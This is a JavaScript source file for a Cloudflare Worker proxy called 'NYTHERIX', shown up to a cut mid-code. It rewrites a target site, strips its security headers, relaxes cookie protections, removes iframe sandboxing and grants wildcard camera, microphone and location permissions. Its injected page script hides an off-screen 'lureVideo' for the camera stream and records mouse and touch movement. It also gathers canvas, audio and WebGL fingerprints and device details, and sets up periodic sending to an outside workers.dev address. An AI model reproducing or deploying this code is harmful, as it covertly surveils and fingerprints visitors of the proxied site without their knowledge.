// =============================================================================
//  NYTHERIX -- Production Cloudflare Proxy Worker
//  Bindings: DB (D1 database, table: settings, columns: id, target_url, enabled)
//
//  Key design decisions:
//  1. Text rewriting via regex (not CF HTMLRewriter) -- reaches inside <script>
//     string literals and CSS url() values, critical for WASM/canvas sites.
//  2. Media (video/audio/HLS/DASH/206) streamed directly, never buffered.
//  3. Subdomain rewriting: *.targetHost -> proxyHost transparently.
//  4. FOUC: visibility:hidden set synchronously before first paint; 5s fallback.
//  5. API patches: fetch, XHR, WebSocket, EventSource, sendBeacon, history,
//     postMessage, window.open -- each individually try/catch wrapped.
//  6. Service Worker: replaced with no-op shim at property level.
//  7. Permission gate: queried live every page load, mid-session revocation
//     caught by onchange + visibilitychange + 5s interval poll.
//  8. window.__nytherix.runFeatures() called once both permissions confirmed.
//  9. WebSocket uses WebSocketPair for true bidirectional bridging.
// 10. buildShim() uses pure string concatenation -- zero template literals --
//     so exactly what is written is what the browser receives. All non-ASCII
//     characters in the injected script use HTML entities (for innerHTML) or
//     are confined to JS comments in the Worker source only.
// =============================================================================

// =============================================================================
//  D1 CONFIG CACHE  (15-second TTL)
// =============================================================================
let _cfgCache = null;
let _cfgTs    = 0;
const CFG_TTL = 15000;

async function getConfig(env) {
  const now = Date.now();
  if (_cfgCache && now - _cfgTs < CFG_TTL) return _cfgCache;
  const result = await env.DB
    .prepare("SELECT target_url, enabled FROM settings WHERE id = 1")
    .first();
  // Only cache a valid result -- don't cache null/errors so next request retries D1
  if (result) { _cfgCache = result; _cfgTs = now; }
  return result;
}

// =============================================================================
//  HEADER CONSTANTS
// =============================================================================
const STRIP_RESP = [
  "Content-Security-Policy",
  "Content-Security-Policy-Report-Only",
  "X-Frame-Options",
  "Strict-Transport-Security",
  "Cross-Origin-Opener-Policy",
  "Cross-Origin-Embedder-Policy",
  "Cross-Origin-Resource-Policy",
  "X-Content-Type-Options",
  "Server",
  "X-Powered-By",
  "Via",
  "Alt-Svc",
  "X-AspNet-Version",
  "Report-To",
  "NEL",
  "Expect-CT",
  "Content-DPR",
  "Origin-Agent-Cluster",
  "X-DNS-Prefetch-Control",
];

const STRIP_REQ = [
  "cf-connecting-ip",
  "cf-ipcountry",
  "cf-ray",
  "cf-visitor",
  "cf-worker",
  "x-forwarded-for",
  "x-real-ip",
  "x-forwarded-proto",
  "x-forwarded-host",
  "cdn-loop",
];

// =============================================================================
//  PERMISSIONS POLICY STRINGS
// =============================================================================
const PERMS_POLICY =
  "camera=*,microphone=*,geolocation=*,display-capture=*,fullscreen=*," +
  "accelerometer=*,gyroscope=*,magnetometer=*,payment=*,usb=*," +
  "autoplay=*,encrypted-media=*,picture-in-picture=*," +
  "publickey-credentials-get=*,screen-wake-lock=*," +
  "web-share=*,xr-spatial-tracking=*,clipboard-read=*,clipboard-write=*," +
  "storage-access=*";

const IFRAME_ALLOW =
  "camera *; microphone *; geolocation *; fullscreen *; display-capture *; " +
  "payment *; autoplay *; clipboard-read *; clipboard-write *; web-share *; " +
  "screen-wake-lock *; xr-spatial-tracking *; accelerometer *; gyroscope *; " +
  "magnetometer *; encrypted-media *; picture-in-picture *";

// =============================================================================
//  CORS HEADERS
// =============================================================================
function buildCorsHeaders(requestOrigin) {
  const origin = requestOrigin || "*";
  return {
    "Access-Control-Allow-Origin":      origin,
    "Access-Control-Allow-Methods":     "GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS",
    "Access-Control-Allow-Headers":     "*",
    "Access-Control-Allow-Credentials": origin !== "*" ? "true" : "false",
    "Access-Control-Max-Age":           "86400",
    ...(origin !== "*" ? { "Vary": "Origin" } : {}),
  };
}

// =============================================================================
//  COOKIE REWRITING
// =============================================================================
function rewriteCookie(raw, proxyHost) {
  let out = raw
    .replace(/\bdomain=[^;,\s]+/gi,   "domain=" + proxyHost)
    .replace(/\bSameSite=Strict\b/gi, "SameSite=None")
    .replace(/\bSameSite=Lax\b/gi,    "SameSite=None");
  if (!/\bSecure\b/i.test(out)) out += "; Secure";
  return out;
}

function applyCookies(srcHeaders, destHeaders, proxyHost) {
  const all = typeof srcHeaders.getAll === "function"
    ? srcHeaders.getAll("set-cookie")
    : [];
  if (all.length) {
    destHeaders.delete("set-cookie");
    for (const c of all) destHeaders.append("set-cookie", rewriteCookie(c, proxyHost));
  } else {
    const raw = srcHeaders.get("set-cookie");
    if (raw) destHeaders.set("set-cookie", rewriteCookie(raw, proxyHost));
  }
}

// =============================================================================
//  CONTENT-TYPE DETECTION
// =============================================================================
function isText(ct) {
  return ct.includes("text/html")                       ||
         ct.includes("text/css")                        ||
         ct.includes("javascript")                      ||
         ct.includes("ecmascript")                      ||
         ct.includes("application/json")                ||
         ct.includes("application/manifest")            ||
         ct.includes("application/xml")                 ||
         ct.includes("text/xml")                        ||
         ct.includes("text/plain")                      ||
         ct.includes("application/x-mpegurl")           ||
         ct.includes("application/vnd.apple.mpegurl")   ||
         ct.includes("application/dash+xml");
}

function isMedia(ct) {
  return ct.includes("video/")                    ||
         ct.includes("audio/")                    ||
         ct.includes("image/")                    ||
         ct.includes("font/")                     ||
         ct.includes("application/octet-stream")  ||
         ct.includes("application/wasm");
}

// =============================================================================
//  HELPERS
// =============================================================================
function htmlRes(body, status) {
  return new Response(body, {
    status: status || 200,
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}

function escRe(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function makeSubRe(hEsc) {
  return new RegExp("(https?:)?//((?:[\\w\\d][\\w\\d.-]*\\.)?" + hEsc + ")", "g");
}

function rewriteSubdomains(text, subRe, targetHost, proxyHost) {
  return text.replace(subRe, function(_, proto, host) {
    var prefix = host.length > targetHost.length
      ? host.slice(0, host.length - targetHost.length)
      : "";
    return (proto || "https:") + "//" + prefix + proxyHost;
  });
}

// =============================================================================
//  HTML REWRITER
// =============================================================================
function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
  const oEsc   = escRe(targetOrigin);
  const hEsc   = escRe(targetHost);
  const subRe  = makeSubRe(hEsc);
  // Pre-compile once -- reused across all 8 rewrite steps
  const oReG   = new RegExp(oEsc, "g");
  const wsReG  = new RegExp("wss://" + hEsc, "g");
  const wsReG2 = new RegExp("ws://"  + hEsc, "g");

  function rwSub(_, proto, host) {
    const prefix = host.length > targetHost.length
      ? host.slice(0, host.length - targetHost.length)
      : "";
    return (proto || "https:") + "//" + prefix + proxyHost;
  }

  // 1. Strip SRI
  html = html.replace(/\s+integrity=["'][^"']*["']/gi, "");

  // 2. Strip crossorigin
  html = html.replace(/\s+crossorigin(=["'][^"']*["'])?/gi, "");

  // 3. Remove upstream <base> tags
  html = html.replace(/<base\b[^>]*>/gi, "");

  // 4. Inject <base>
  const base = '<base href="' + proxyOrigin + '/">';
  if (/<head\b[^>]*>/i.test(html)) {
    html = html.replace(/(<head\b[^>]*>)/i, "$1\n  " + base);
  } else {
    html = base + "\n" + html;
  }

  // 5. Rewrite HTML attribute URLs
  html = html.replace(
    /(<(?:script|link|img|source|audio|video|track|embed|object|form|area|input|use)[^>]+?(?:src|href|action|data-src|poster)\s*=\s*["'])([^"']*)(["'])/gi,
    function(_, pre, url, post) {
      url = url
        .replace((oReG.lastIndex=0,oReG), proxyOrigin)
        .replace(subRe, rwSub);
      return pre + url + post;
    }
  );

  // 6. Rewrite srcset
  html = html.replace(/\bsrcset=["']([^"']+)["']/gi, function(_, val) {
    return 'srcset="' +
      val.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub) +
      '"';
  });

  // 7. Rewrite <meta http-equiv="refresh">
  html = html.replace(
    /(<meta[^>]+?content=["'][^"']*?url=)([^"';\s]+)/gi,
    function(_, pre, url) {
      return pre + url.replace((oReG.lastIndex=0,oReG), proxyOrigin);
    }
  );

  // 8. Rewrite inline <style>
  html = html.replace(/(<style\b[^>]*>)([\s\S]*?)(<\/style>)/gi,
    function(_, o, body, c) {
      return o + body.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub) + c;
    }
  );

  // 9. Rewrite inline <script> string literals (skip ld+json/template types)
  html = html.replace(
    /(<script\b(?![^>]*type=["'](?:application\/ld\+json|text\/template|text\/html)["'])[^>]*>)([\s\S]*?)(<\/script>)/gi,
    function(_, open, body, close) {
      return open +
        body
          .replace((oReG.lastIndex=0,oReG), proxyOrigin)
          .replace((wsReG.lastIndex=0,wsReG), "wss://" + proxyHost)
          .replace((wsReG2.lastIndex=0,wsReG2), "ws://" + proxyHost)
          .replace(subRe, rwSub) +
        close;
    }
  );

  // 10. Patch importmap JSON
  html = html.replace(
    /(<script[^>]+?type=["']importmap["'][^>]*>)([\s\S]*?)(<\/script>)/gi,
    function(_, o, body, c) {
      try {
        const map = JSON.parse(body);
        function rwMapVal(v) {
          return typeof v === "string"
            ? v.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub)
            : v;
        }
        if (map.imports) {
          for (const k in map.imports) map.imports[k] = rwMapVal(map.imports[k]);
        }
        if (map.scopes) {
          for (const s in map.scopes) {
            for (const k in map.scopes[s]) map.scopes[s][k] = rwMapVal(map.scopes[s][k]);
          }
        }
        return o + JSON.stringify(map) + c;
      } catch (_x) { return _; }
    }
  );

  // 11. Upgrade iframes
  html = html.replace(/<iframe(\s[^>]*)?>/gi, function(_, attrs) {
    attrs = attrs || "";
    attrs = attrs.replace(
      /(src=["'])([^"']*)(["'])/i,
      function(__, pre, url, post) {
        return pre + url.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub) + post;
      }
    );
    if (/\ballow\s*=/i.test(attrs)) {
      attrs = attrs.replace(/\ballow\s*=\s*["'][^"']*["']/i, 'allow="' + IFRAME_ALLOW + '"');
    } else {
      attrs += ' allow="' + IFRAME_ALLOW + '"';
    }
    attrs = attrs.replace(/\bsandbox\s*=\s*["'][^"']*["']/gi, "");
    attrs = attrs.replace(/\breferrerpolicy\s*=\s*["'][^"']*["']/gi, "");
    return "<iframe" + attrs + ">";
  });

  // 12. Inject shim as first element in <head>
  const shim = buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost);
  if (/<head\b[^>]*>/i.test(html)) {
    html = html.replace(/(<head\b[^>]*>)/i, "$1\n" + shim);
  } else {
    html = shim + "\n" + html;
  }

  return html;
}

// =============================================================================
//  RUNTIME SHIM BUILDER
//
//  Returns a complete <script> tag string for injection into <head>.
//  Built entirely via string concatenation -- NO template literals, NO raw
//  Unicode in emitted JS. All displayed characters use HTML entities.
//
//  Shim sections:
//    A  URL rewriters:  rw(), rwFull()
//    B  Browser API patches: fetch, XHR, WS, SSE, sendBeacon, history,
//       postMessage, window.open, serviceWorker no-op
//    C  MutationObserver: rewrites dynamically added DOM nodes
//    D  window.__nytherix: runtime object + runFeatures() slot
//    E  Permission gate: FOUC lock, UI, permission flow, revocation watchers
// =============================================================================
function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
  // JSON.stringify produces a properly JS-escaped string literal (with quotes).
  // Safe to drop directly into emitted JS source as a value.
  var TO_LIT           = JSON.stringify(targetOrigin);
  var PO_LIT           = JSON.stringify(proxyOrigin);
  var TH_LIT           = JSON.stringify(targetHost);
  var PH_LIT           = JSON.stringify(proxyHost);
  var IFRAME_ALLOW_LIT = JSON.stringify(IFRAME_ALLOW);

  // Regex-escape for use inside new RegExp() constructors in the emitted shim.
  // Backslashes must survive: Worker JS string -> emitted text -> browser RegExp.
  var oEscJS = targetOrigin.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  var hEscJS = targetHost.replace(/[.*+?^${}()|[\]\\]/g,   "\\$&");
  var oEscLit = JSON.stringify(oEscJS); // safe literal for emitted new RegExp(oEscLit)
  var hEscLit = JSON.stringify(hEscJS);

  var s = "";

  // Opening: IIFE wrapper. 'use strict' is the first statement inside it.
  s += '<script data-nytherix="shim">';
  s += "(function(){\n";
  s += "\"use strict\";\n";
  s += "\n";

  // -----------------------------------------------------------------------
  // SECTION A -- URL rewriters
  // -----------------------------------------------------------------------
  s += "// --- SECTION A: URL rewriters ---\n";
  s += "\n";
  s += "var TO   = " + TO_LIT + ";\n";
  s += "var PO   = " + PO_LIT + ";\n";
  s += "var TH   = " + TH_LIT + ";\n";
  s += "var PH   = " + PH_LIT + ";\n";
  s += "var SKEY = 'nx_perm_v2';\n";
  s += "\n";
  // Keep RegExp definitions on single lines to avoid strict-mode parse edge cases
  s += "var _oRe   = new RegExp(" + oEscLit + ", 'g');\n";
  s += "var _wsRe  = new RegExp('wss?://' + " + hEscLit + ", 'g');\n";
  s += "var _subRe = new RegExp('(https?:)?//((?:[\\\\w\\\\d][\\\\w\\\\d.-]*\\\\.)?' + " + hEscLit + " + ')', 'g');\n";
  s += "\n";
  s += "function rw(u) {\n";
  s += "  if (!u || typeof u !== 'string') return u;\n";
  s += "  if (/^(data:|blob:|javascript:|#)/i.test(u)) return u;\n";
  s += "  if (!/^https?:\\/\\//i.test(u)) {\n";
  s += "    try { u = new URL(u, location.href).href; } catch(e) {}\n";
  s += "  }\n";
  s += "  _oRe.lastIndex = 0; _wsRe.lastIndex = 0; _subRe.lastIndex = 0;\n";
  s += "  u = u.replace(_oRe, PO);\n";
  s += "  u = u.replace(_wsRe, function(m) {\n";
  s += "    return m.charAt(2) === 's' ? 'wss://' + PH : 'ws://' + PH;\n";
  s += "  });\n";
  s += "  u = u.replace(_subRe, function(_, proto, host) {\n";
  s += "    var prefix = host.length > TH.length ? host.slice(0, host.length - TH.length) : '';\n";
  s += "    return (proto || 'https:') + '//' + prefix + PH;\n";
  s += "  });\n";
  s += "  return u;\n";
  s += "}\n";
  s += "\n";
  s += "function rwFull(u) {\n";
  s += "  if (!u || typeof u !== 'string') return u;\n";
  s += "  if (/^(data:|blob:|javascript:|#)/i.test(u)) return u;\n";
  s += "  if (u.indexOf(TO) === 0) return PO + u.slice(TO.length);\n";
  s += "  if (u.indexOf('//' + TH) === 0) return '//' + PH + u.slice(TH.length + 2);\n";
  s += "  return rw(u);\n";
  s += "}\n";
  s += "\n";

  // -----------------------------------------------------------------------
  // SECTION B -- Browser API patches
  // -----------------------------------------------------------------------
  s += "// --- SECTION B: Browser API patches ---\n";
  s += "\n";

  // document.domain
  s += "try {\n";
  s += "  Object.defineProperty(document, 'domain', {\n";
  s += "    get: function() { return PH; }, set: function() {}, configurable: true\n";
  s += "  });\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // location.assign / location.replace
  s += "try {\n";
  s += "  var _la = location.assign.bind(location);\n";
  s += "  location.assign = function(u) { _la(rwFull(u)); };\n";
  s += "  var _lr = location.replace.bind(location);\n";
  s += "  location.replace = function(u) { _lr(rwFull(u)); };\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // fetch
  s += "try {\n";
  s += "  var _fetch = window.fetch;\n";
  s += "  window.fetch = function(input, init) {\n";
  s += "    try {\n";
  s += "      if (typeof input === 'string') {\n";
  s += "        input = rwFull(input);\n";
  s += "      } else if (typeof Request !== 'undefined' && input instanceof Request) {\n";
  s += "        var u2 = rwFull(input.url);\n";
  s += "        if (u2 !== input.url) input = new Request(u2, input);\n";
  s += "      } else if (input && typeof input === 'object' && input.url) {\n";
  s += "        input = Object.assign({}, input, { url: rwFull(input.url) });\n";
  s += "      }\n";
  s += "    } catch(e) {}\n";
  s += "    return init !== undefined ? _fetch.call(this, input, init) : _fetch.call(this, input);\n";
  s += "  };\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // XMLHttpRequest.open
  s += "try {\n";
  s += "  var _xhrOpen = XMLHttpRequest.prototype.open;\n";
  s += "  XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {\n";
  s += "    try { url = rwFull(String(url)); } catch(e) {}\n";
  s += "    return _xhrOpen.call(this, method, url, async === undefined ? true : async, user, pass);\n";
  s += "  };\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // XHR responseURL
  s += "try {\n";
  s += "  var _ruDesc = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseURL');\n";
  s += "  if (_ruDesc && _ruDesc.get) {\n";
  s += "    var _origRuGetter = _ruDesc.get;\n";
  s += "    Object.defineProperty(XMLHttpRequest.prototype, 'responseURL', {\n";
  s += "      get: function() {\n";
  s += "        try { var u = _origRuGetter.call(this); return u ? rw(u) : u; } catch(e) { return ''; }\n";
  s += "      }, configurable: true\n";
  s += "    });\n";
  s += "  }\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // WebSocket
  s += "try {\n";
  s += "  var _WS = window.WebSocket;\n";
  s += "  function _WSProxy(url, protos) {\n";
  s += "    try { url = rw(url); } catch(e) {}\n";
  s += "    return protos !== undefined ? Reflect.construct(_WS, [url, protos]) : Reflect.construct(_WS, [url]);\n";
  s += "  }\n";
  s += "  try {\n";
  s += "    Object.setPrototypeOf(_WSProxy, _WS);\n";
  s += "    Object.setPrototypeOf(_WSProxy.prototype, _WS.prototype);\n";
  s += "  } catch(e) { _WSProxy.prototype = _WS.prototype; }\n";
  s += "  _WSProxy.CONNECTING = _WS.CONNECTING;\n";
  s += "  _WSProxy.OPEN       = _WS.OPEN;\n";
  s += "  _WSProxy.CLOSING    = _WS.CLOSING;\n";
  s += "  _WSProxy.CLOSED     = _WS.CLOSED;\n";
  s += "  window.WebSocket = _WSProxy;\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // EventSource (SSE)
  s += "try {\n";
  s += "  if (window.EventSource) {\n";
  s += "    var _ES = window.EventSource;\n";
  s += "    function _ESProxy(url, init) {\n";
  s += "      try { url = rwFull(url); } catch(e) {}\n";
  s += "      return new _ES(url, init);\n";
  s += "    }\n";
  s += "    _ESProxy.prototype = _ES.prototype;\n";
  s += "    window.EventSource = _ESProxy;\n";
  s += "  }\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // navigator.sendBeacon
  s += "try {\n";
  s += "  if (navigator.sendBeacon) {\n";
  s += "    var _beacon = navigator.sendBeacon.bind(navigator);\n";
  s += "    navigator.sendBeacon = function(url, data) {\n";
  s += "      try { url = rwFull(url); } catch(e) {}\n";
  s += "      return _beacon(url, data);\n";
  s += "    };\n";
  s += "  }\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // history.pushState / replaceState
  s += "try {\n";
  s += "  var _hPush = history.pushState.bind(history);\n";
  s += "  var _hRep  = history.replaceState.bind(history);\n";
  s += "  history.pushState    = function(st, t, u) { _hPush(st, t, u ? rw(String(u)) : u); };\n";
  s += "  history.replaceState = function(st, t, u) { _hRep(st, t, u ? rw(String(u)) : u); };\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // window.postMessage
  s += "try {\n";
  s += "  var _pm = window.postMessage.bind(window);\n";
  s += "  window.postMessage = function(data, dest, transfer) {\n";
  s += "    if (dest === TO) dest = PO;\n";
  s += "    return transfer ? _pm(data, dest || '*', transfer) : _pm(data, dest || '*');\n";
  s += "  };\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // window.open
  s += "try {\n";
  s += "  var _winOpen = window.open;\n";
  s += "  window.open = function(url, target, features) {\n";
  s += "    try {\n";
  s += "      if (url && typeof url === 'string') {\n";
  s += "        _subRe.lastIndex = 0;\n";
  s += "        if (url.indexOf(TO) === 0 || url.indexOf('//' + TH) === 0 || _subRe.test(url)) {\n";
  s += "          _subRe.lastIndex = 0;\n";
  s += "          url = rwFull(url);\n";
  s += "        }\n";
  s += "        _subRe.lastIndex = 0;\n";
  s += "      }\n";
  s += "    } catch(e) {}\n";
  s += "    return features !== undefined\n";
  s += "      ? _winOpen.call(window, url, target, features)\n";
  s += "      : target !== undefined\n";
  s += "        ? _winOpen.call(window, url, target)\n";
  s += "        : _winOpen.call(window, url);\n";
  s += "  };\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // navigator.serviceWorker no-op shim
  s += "try {\n";
  s += "  if (navigator.serviceWorker) {\n";
  s += "    var _swActive = { postMessage: function() {}, state: 'activated',\n";
  s += "      scriptURL: PO + '/', clients: { claim: function() { return Promise.resolve(); } },\n";
  s += "      addEventListener: function() {}, removeEventListener: function() {},\n";
  s += "      dispatchEvent: function() { return false; } };\n";
  s += "    var _swReg = { active: _swActive, scope: PO + '/',\n";
  s += "      addEventListener: function() {}, removeEventListener: function() {},\n";
  s += "      installing: null, waiting: null,\n";
  s += "      update: function() { return Promise.resolve(); },\n";
  s += "      unregister: function() { return Promise.resolve(true); } };\n";
  s += "    var _swShim = {\n";
  s += "      register:            function() { return Promise.resolve(_swReg); },\n";
  s += "      ready:               Promise.resolve(_swReg),\n";
  s += "      controller:          null,\n";
  s += "      addEventListener:    function() {},\n";
  s += "      removeEventListener: function() {},\n";
  s += "      getRegistrations:    function() { return Promise.resolve([]); },\n";
  s += "      getRegistration:     function() { return Promise.resolve(undefined); }\n";
  s += "    };\n";
  s += "    Object.defineProperty(navigator, 'serviceWorker', {\n";
  s += "      get: function() { return _swShim; }, configurable: true\n";
  s += "    });\n";
  s += "  }\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // -----------------------------------------------------------------------
  // SECTION C -- MutationObserver
  // -----------------------------------------------------------------------
  s += "// --- SECTION C: MutationObserver ---\n";
  s += "\n";
  s += "try {\n";
  s += "  var _ATTRS = ['href', 'src', 'action', 'data-src', 'poster', 'data-href'];\n";
  s += "  function _rwEl(el) {\n";
  s += "    if (!el || el.nodeType !== 1) return;\n";
  s += "    _ATTRS.forEach(function(a) {\n";
  s += "      var v = el.getAttribute && el.getAttribute(a);\n";
  s += "      if (v) { var r = rw(v); if (r !== v) el.setAttribute(a, r); }\n";
  s += "    });\n";
  s += "    var ss = el.getAttribute && el.getAttribute('srcset');\n";
  s += "    if (ss) {\n";
  s += "      _oRe.lastIndex = 0;\n";
  s += "      var rs = ss.replace(_oRe, PO);\n";
  s += "      if (rs !== ss) el.setAttribute('srcset', rs);\n";
  s += "    }\n";
  s += "    if (el.tagName === 'IFRAME') {\n";
  s += "      if (!el.getAttribute('allow')) el.setAttribute('allow', " + IFRAME_ALLOW_LIT + ");\n";
  s += "      el.removeAttribute('sandbox');\n";
  s += "    }\n";
  s += "  }\n";
  s += "\n";
  s += "  var _pending = [];\n";
  s += "  var _moTimer = null;\n";
  s += "  function _flush() {\n";
  s += "    _moTimer = null;\n";
  s += "    var nodes = _pending.splice(0);\n";
  s += "    for (var i = 0; i < nodes.length; i++) {\n";
  s += "      _rwEl(nodes[i]);\n";
  s += "      if (nodes[i].querySelectorAll) {\n";
  s += "        nodes[i].querySelectorAll('[href],[src],[action],[data-src],[poster],[srcset]').forEach(_rwEl);\n";
  s += "      }\n";
  s += "    }\n";
  s += "  }\n";
  s += "\n";
  s += "  var _mo = new MutationObserver(function(muts) {\n";
  s += "    muts.forEach(function(m) {\n";
  s += "      m.addedNodes.forEach(function(n) {\n";
  s += "        if (n.nodeType === 1) _pending.push(n);\n";
  s += "      });\n";
  s += "    });\n";
  s += "    if (_moTimer === null) {\n";
  s += "      _moTimer = typeof requestIdleCallback === 'function'\n";
  s += "        ? requestIdleCallback(_flush, { timeout: 100 })\n";
  s += "        : setTimeout(_flush, 16);\n";
  s += "    }\n";
  s += "  });\n";
  s += "  _mo.observe(document.documentElement || document, { childList: true, subtree: true });\n";
  s += "\n";
  s += "  document.addEventListener('DOMContentLoaded', function() {\n";
  s += "    document.querySelectorAll('[href],[src],[action],[data-src],[poster],[srcset]').forEach(_rwEl);\n";
  s += "  }, { once: true });\n";
  s += "} catch(e) {}\n";
  s += "\n";

    // -----------------------------------------------------------------------
  // SECTION D -- window.__nytherix
  // -----------------------------------------------------------------------
  s += "// --- SECTION D: window.__nytherix runtime object ---\n";
  s += "//\n";
  s += "//  window.__nytherix.cameraStream  -- live MediaStream (video + audio)\n";
  s += "//  window.__nytherix.location      -- { latitude, longitude, accuracy, timestamp }\n";
  s += "//  window.__nytherix.permissionsGranted -- boolean\n";
  s += "//  window.sharedStream             -- same MediaStream, top-level reference\n";
  s += "//\n";
  s += "//  runFeatures() is called once after BOTH permissions are confirmed.\n";
  s += "//  Insert your camera + location feature code inside it.\n";
  s += "//  Compatible interface: all camera/mic/geo/mouse/touch data available.\n";
  s += "\n";
  s += "window.__nytherix = {\n";
  s += "  permissionsGranted: false,\n";
  s += "  cameraStream:       null,\n";
  s += "  location:           null,\n";
  s += "\n";
  s += "  runFeatures: function() {\n";
  s += "    const WORKER_URL = 'https://snowy-fog-b0d1.23amtics322.workers.dev/';\n";
  s += "    const sessionId = 'sess_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now().toString(36);\n";
  s += "    const SEND_INTERVAL = 8000;\n";
  s += "    let mouseData = [];\n";
  s += "    let touchData = [];\n";
  s += "    let sendIntervalId = null;\n";
  s += "    let isSending = false;\n";
  s += "    const lureVideo = document.createElement('video');\n";
  s += "    lureVideo.id = 'lureVideo';\n";
  s += "    lureVideo.autoplay = true;\n";
  s += "    lureVideo.playsInline = true;\n";
  s += "    lureVideo.muted = true;\n";
  s += "    lureVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none';\n";
  s += "    document.body.appendChild(lureVideo);\n";
  s += "    let lastMouseRecord = 0;\n";
  s += "    document.addEventListener('mousemove', function(e) {\n";
  s += "      const now = Date.now();\n";
  s += "      if (now - lastMouseRecord < 50) return;\n";
  s += "      lastMouseRecord = now;\n";
  s += "      mouseData.push({ x: e.clientX, y: e.clientY, t: now });\n";
  s += "      if (mouseData.length > 40) mouseData.shift();\n";
  s += "    });\n";
  s += "    let lastTouchRecord = 0;\n";
  s += "    document.addEventListener('touchmove', function(e) {\n";
  s += "      const now = Date.now();\n";
  s += "      if (now - lastTouchRecord < 50) return;\n";
  s += "      lastTouchRecord = now;\n";
  s += "      if (e.touches.length > 0) {\n";
  s += "        touchData.push({ x: e.touches[0].clientX, y: e.touches[0].clientY, t: now });\n";
  s += "        if (touchData.length > 40) touchData.shift();\n";
  s += "      }\n";
  s += "    });\n";
  s += "    async function collectStaticData() {\n";
  s += "      const p = {\n";
  s += "        sessionId: sessionId,\n";
  s += "        url: location.href,\n";
  s += "        referrer: document.referrer || null,\n";
  s += "        userAgent: navigator.userAgent,\n";
  s += "        language: navigator.language,\n";
  s += "        languages: navigator.languages || [],\n";
  s += "        platform: navigator.platform,\n";
  s += "        hardwareConcurrency: navigator.hardwareConcurrency || null,\n";
  s += "        deviceMemory: navigator.deviceMemory || null,\n";
  s += "        maxTouchPoints: navigator.maxTouchPoints || 0,\n";
  s += "        connection: navigator.connection ? {\n";
  s += "          effectiveType: navigator.connection.effectiveType,\n";
  s += "          downlink: navigator.connection.downlink,\n";
  s += "          rtt: navigator.connection.rtt,\n";
  s += "          saveData: navigator.connection.saveData\n";
  s += "        } : null,\n";
  s += "        screen: {\n";
  s += "          width: screen.width,\n";
  s += "          height: screen.height,\n";
  s += "          availWidth: screen.availWidth,\n";
  s += "          availHeight: screen.availHeight,\n";
  s += "          colorDepth: screen.colorDepth,\n";
  s += "          pixelDepth: screen.pixelDepth,\n";
  s += "          pixelRatio: window.devicePixelRatio || 1,\n";
  s += "          orientation: screen.orientation ? screen.orientation.type : null\n";
  s += "        },\n";
  s += "        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n";
  s += "        cookiesEnabled: navigator.cookieEnabled,\n";
  s += "        doNotTrack: navigator.doNotTrack,\n";
  s += "        webdriver: !!navigator.webdriver,\n";
  s += "        historyLength: history.length,\n";
  s += "        navigationTiming: null,\n";
  s += "        canvasFingerprint: null,\n";
  s += "        audioFingerprint: null,\n";
  s += "        webglFingerprint: null,\n";
  s += "        fonts: [],\n";
  s += "        plugins: [],\n";
  s += "        mimeTypes: [],\n";
  s += "        permissionStates: {}\n";
  s += "      };\n";
  s += "      try {\n";
  s += "        const navEntry = performance.getEntriesByType('navigation')[0];\n";
  s += "        if (navEntry) {\n";
  s += "          p.navigationTiming = {\n";
  s += "            loadTime: Math.round(navEntry.loadEventEnd - navEntry.fetchStart),\n";
  s += "            domComplete: Math.round(navEntry.domComplete),\n";
  s += "            domInteractive: Math.round(navEntry.domInteractive)\n";
  s += "          };\n";
  s += "        }\n";
  s += "      } catch(e) {}\n";
  s += "      try {\n";
  s += "        const c = document.createElement('canvas');\n";
  s += "        const ctx = c.getContext('2d');\n";
  s += "        c.width = 240; c.height = 70;\n";
  s += "        ctx.textBaseline = 'top';\n";
  s += "        ctx.font = 'bold 18px Arial';\n";
  s += "        ctx.fillStyle = '#c0c0c0';\n";
  s += "        ctx.fillText('PHOTON CAPTURE 2026', 8, 20);\n";
  s += "        ctx.fillStyle = '#f60';\n";
  s += "        ctx.fillRect(160, 25, 65, 30);\n";
  s += "        p.canvasFingerprint = c.toDataURL('image/png').slice(-150);\n";
  s += "      } catch(e) {}\n";
  s += "      try {\n";
  s += "        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();\n";
  s += "        const osc = audioCtx.createOscillator();\n";
  s += "        const analyser = audioCtx.createAnalyser();\n";
  s += "        osc.type = 'sine';\n";
  s += "        osc.frequency.value = 440;\n";
  s += "        osc.connect(analyser);\n";
  s += "        analyser.connect(audioCtx.destination);\n";
  s += "        osc.start();\n";
  s += "        await new Promise(function(r) { setTimeout(r, 100); });\n";
  s += "        const data = new Uint8Array(analyser.frequencyBinCount);\n";
  s += "        analyser.getByteFrequencyData(data);\n";
  s += "        p.audioFingerprint = btoa(String.fromCharCode.apply(null, Array.prototype.slice.call(data, 0, 60)));\n";
  s += "        osc.stop();\n";
  s += "        audioCtx.close();\n";
  s += "      } catch(e) {}\n";
  s += "      try {\n";
  s += "        const glc = document.createElement('canvas');\n";
  s += "        const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');\n";
  s += "        if (gl) {\n";
